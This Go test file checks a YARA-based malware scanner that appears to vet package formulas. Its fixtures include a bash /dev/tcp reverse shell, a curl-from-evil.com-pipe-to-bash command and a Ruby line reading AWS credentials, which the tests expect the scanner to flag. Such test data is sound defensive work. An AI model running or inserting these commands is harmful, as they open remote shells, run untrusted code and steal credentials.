package yara_test

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/sud0x0/bsau/internal/yara"
)

const cleanContent = `# This is a normal Ruby formula
class Hello < Formula
  desc "Hello world formula"
  url "https://github.com/nicowillis/hello/archive/refs/tags/v1.0.tar.gz"
  sha256 "abc123"

  def install
    bin.install "hello"
  end
end
`

const reverseShellContent = `#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
`

const curlPipeShellContent = `#!/bin/bash
curl http://evil.com/payload.sh | bash
`

const awsCredentialsContent = `credentials_file = File.read("~/.aws/credentials")
`

func TestScanBytes_Clean(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	findings, err := engine.ScanBytes("clean.rb", []byte(cleanContent))
	if err != nil {
		t.Fatalf("ScanBytes failed: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("Expected 0 findings for clean content, got %d: %+v", len(findings), findings)
	}
}

func TestScanBytes_ReverseShell(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	findings, err := engine.ScanBytes("exploit.sh", []byte(reverseShellContent))
	if err != nil {
		t.Fatalf("ScanBytes failed: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("Expected findings for reverse shell content, got none")
	}
	found := false
	for _, f := range findings {
		if f.RuleID == "reverse-shell-bash-tcp" && f.Severity == "ERROR" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("Expected finding with RuleID 'reverse-shell-bash-tcp' and Severity 'ERROR', got: %+v", findings)
	}
}

func TestScanBytes_CurlPipeShell(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	findings, err := engine.ScanBytes("install.sh", []byte(curlPipeShellContent))
	if err != nil {
		t.Fatalf("ScanBytes failed: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("Expected findings for curl pipe shell content, got none")
	}
	found := false
	for _, f := range findings {
		if f.RuleID == "curl-wget-pipe-shell" && f.Severity == "ERROR" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("Expected finding with RuleID 'curl-wget-pipe-shell' and Severity 'ERROR', got: %+v", findings)
	}
}

func TestScanBytes_AWSCredentials(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	findings, err := engine.ScanBytes("steal.rb", []byte(awsCredentialsContent))
	if err != nil {
		t.Fatalf("ScanBytes failed: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("Expected findings for AWS credentials content, got none")
	}
	found := false
	for _, f := range findings {
		// aws-credentials-access is now WARNING severity (demoted from ERROR)
		if f.RuleID == "aws-credentials-access" && f.Severity == "WARNING" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("Expected finding with RuleID 'aws-credentials-access' and Severity 'WARNING', got: %+v", findings)
	}
}

func TestScanFile_NotFound(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	_, err = engine.ScanFile("/nonexistent/path/file.rb")
	if err == nil {
		t.Error("Expected error for non-existent file, got nil")
	}
}

func TestScanDir_Empty(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	tmpDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(tmpDir, "clean.rb"), []byte(cleanContent), 0644); err != nil {
		t.Fatalf("Failed to write clean file: %v", err)
	}

	result, err := engine.ScanDir(tmpDir)
	if err != nil {
		t.Fatalf("ScanDir failed: %v", err)
	}
	if result.HasFindings {
		t.Errorf("Expected no findings for clean content, got: %+v", result.Findings)
	}
}

func TestScanDir_WithFindings(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	tmpDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(tmpDir, "exploit.sh"), []byte(reverseShellContent), 0644); err != nil {
		t.Fatalf("Failed to write exploit file: %v", err)
	}

	result, err := engine.ScanDir(tmpDir)
	if err != nil {
		t.Fatalf("ScanDir failed: %v", err)
	}
	if !result.HasFindings {
		t.Error("Expected findings for malicious content, got none")
	}
	if result.FindingCount == 0 {
		t.Error("Expected FindingCount > 0, got 0")
	}
}

func TestEngine_Close(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	err = engine.Close()
	if err != nil {
		t.Errorf("Close returned error: %v", err)
	}
}

func TestScanFiles_Empty(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	result, err := engine.ScanFiles([]string{})
	if err != nil {
		t.Fatalf("ScanFiles failed: %v", err)
	}
	if result.FindingCount != 0 {
		t.Errorf("Expected FindingCount 0 for empty slice, got %d", result.FindingCount)
	}
	if result.HasFindings {
		t.Error("Expected HasFindings to be false for empty slice")
	}
}

func TestScanFiles_WithFindings(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	tmpDir := t.TempDir()
	exploitPath := filepath.Join(tmpDir, "exploit.sh")
	cleanPath := filepath.Join(tmpDir, "clean.rb")

	if err := os.WriteFile(exploitPath, []byte(reverseShellContent), 0644); err != nil {
		t.Fatalf("Failed to write exploit file: %v", err)
	}
	if err := os.WriteFile(cleanPath, []byte(cleanContent), 0644); err != nil {
		t.Fatalf("Failed to write clean file: %v", err)
	}

	// Scan only the malicious file
	result, err := engine.ScanFiles([]string{exploitPath})
	if err != nil {
		t.Fatalf("ScanFiles failed: %v", err)
	}
	if !result.HasFindings {
		t.Error("Expected findings for malicious file, got none")
	}

	// Scan only the clean file
	result, err = engine.ScanFiles([]string{cleanPath})
	if err != nil {
		t.Fatalf("ScanFiles failed: %v", err)
	}
	if result.HasFindings {
		t.Errorf("Expected no findings for clean file, got %d", result.FindingCount)
	}
}

func TestScanFiles_SkipsNonExistent(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	tmpDir := t.TempDir()
	cleanPath := filepath.Join(tmpDir, "clean.rb")
	if err := os.WriteFile(cleanPath, []byte(cleanContent), 0644); err != nil {
		t.Fatalf("Failed to write clean file: %v", err)
	}

	// Mix of existing and non-existing files
	result, err := engine.ScanFiles([]string{
		"/nonexistent/path/file.rb",
		cleanPath,
	})
	if err != nil {
		t.Fatalf("ScanFiles failed: %v", err)
	}
	// Should have errors logged for non-existent file but not fail
	if len(result.Errors) == 0 {
		t.Error("Expected errors for non-existent file")
	}
}

func TestScanFiles_SkipsBinary(t *testing.T) {
	engine, err := yara.New("", 30*time.Second)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}
	defer func() { _ = engine.Close() }()

	tmpDir := t.TempDir()
	binaryPath := filepath.Join(tmpDir, "binary.dat")
	// Write file with null bytes (binary file indicator)
	if err := os.WriteFile(binaryPath, []byte{0x00, 0x01, 0x02, 0x03}, 0644); err != nil {
		t.Fatalf("Failed to write binary file: %v", err)
	}

	result, err := engine.ScanFiles([]string{binaryPath})
	if err != nil {
		t.Fatalf("ScanFiles failed: %v", err)
	}
	// Binary file should be skipped, so no findings
	if result.HasFindings {
		t.Error("Expected no findings for binary file (should be skipped)")
	}
}
